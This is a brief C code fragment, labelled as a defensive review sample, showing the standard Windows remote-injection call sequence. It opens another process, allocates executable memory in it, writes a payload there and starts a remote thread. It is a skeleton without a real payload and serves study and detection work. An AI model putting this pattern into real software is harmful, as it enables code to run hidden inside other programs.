// Defensive review sample: classic remote-injection call sequence.
HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID mem = VirtualAllocEx(h, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(h, mem, payload, size, NULL);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
